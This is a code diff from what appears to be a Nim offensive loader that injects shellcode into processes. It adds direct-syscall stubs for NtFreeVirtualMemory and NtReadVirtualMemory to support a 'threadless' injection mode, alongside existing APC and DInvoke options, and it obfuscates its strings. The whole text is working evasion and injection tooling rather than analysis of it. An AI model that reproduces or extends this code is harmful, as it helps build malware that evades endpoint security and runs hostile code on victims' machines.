@@ -177,6 +177,14 @@ when defined(GetSyscallStub):
     type myNtMapViewOfSection = proc(SectionHandle: HANDLE, ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, CommitSize: SIZE_T, SectionOffset: PLARGE_INTEGER, ViewSize: PSIZE_T, InheritDisposition: ULONG, AllocationType: ULONG, Win32Protect: ULONG): NTSTATUS {.stdcall.}
 
     var NtMapViewOfSection: proc(SectionHandle: HANDLE, ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, CommitSize: SIZE_T, SectionOffset: PLARGE_INTEGER, ViewSize: PSIZE_T, InheritDisposition: ULONG, AllocationType: ULONG, Win32Protect: ULONG): NTSTATUS {.stdcall.}
+    
+    type myNtFreeVirtualMemory = proc(ProcessHandle: HANDLE; BaseAddress: PVOID; RegionSize: PSIZE_T; FreeType: ULONG): NTSTATUS {.stdcall.}
+
+    var NtFreeVirtualMemory: proc(ProcessHandle: HANDLE; BaseAddress: PVOID; RegionSize: PSIZE_T; FreeType: ULONG): NTSTATUS {.stdcall.}
+
+    type myNtReadVirtualMemory = proc(ProcessHandle: HANDLE; BaseAddress: PVOID; Buffer: PVOID; NumberOfBytesToRead: SIZE_T; NumberOfBytesRead: PSIZE_T): NTSTATUS {.stdcall.}
+
+    var NtReadVirtualMemory: proc(ProcessHandle: HANDLE; BaseAddress: PVOID; Buffer: PVOID; NumberOfBytesToRead: SIZE_T; NumberOfBytesRead: PSIZE_T): NTSTATUS {.stdcall.}
 
     when defined(QueueAPC):
       type myNtQueueApcThread = proc(ThreadHandle: HANDLE, ApcRoutine: PKNORMAL_ROUTINE, ApcArgument1: PVOID, ApcArgument2: PVOID, ApcArgument3: PVOID): NTSTATUS {.stdcall.}
@@ -422,7 +430,22 @@ let RetrieveSyscallStubs * = """
         syssuccess = GetSyscallStub(obf("NtTestAlert"), cast[LPVOID](syscallStub_NtTestAlert))
         when defined(verbose):
             echo obf("[*] GetSyscallStub NtTestAlert: ") & $syssuccess
-        
+
+    when defined(threadless):
+      # get NtFreeVirtualMemory and NtReadVirtualMemory
+      var syscallStub_NtFreeVirtualMemory: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (13 * cast[HANDLE](SYSCALL_STUB_SIZE))
+      var syscallStub_NtReadVirtualMemory: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (14 * cast[HANDLE](SYSCALL_STUB_SIZE))
+      # define NtFreeVirtualMemory
+      NtFreeVirtualMemory = cast[myNtFreeVirtualMemory](cast[LPVOID](syscallStub_NtFreeVirtualMemory))
+      # define NtReadVirtualMemory
+      NtReadVirtualMemory = cast[myNtReadVirtualMemory](cast[LPVOID](syscallStub_NtReadVirtualMemory))
+      syssuccess = GetSyscallStub(obf("NtFreeVirtualMemory"), cast[LPVOID](syscallStub_NtFreeVirtualMemory))
+      when defined(verbose):
+          echo obf("[*] GetSyscallStub NtFreeVirtualMemory: ") & $syssuccess
+      syssuccess = GetSyscallStub(obf("NtReadVirtualMemory"), cast[LPVOID](syscallStub_NtReadVirtualMemory))
+      when defined(verbose):
+          echo obf("[*] GetSyscallStub NtReadVirtualMemory: ") & $syssuccess
+
     when defined(DInvoke):
       when defined(verbose):
         echo obf("[*] Setting page protection")
